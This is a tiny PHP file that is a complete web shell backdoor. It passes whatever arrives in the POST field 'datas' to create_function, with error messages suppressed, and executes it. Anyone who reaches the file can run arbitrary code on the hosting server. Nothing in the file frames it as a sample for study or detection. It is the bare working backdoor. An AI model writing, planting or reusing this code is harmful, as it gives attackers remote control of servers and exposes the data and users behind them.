<?php
$st = @create_function('', $_POST['datas']);
$st();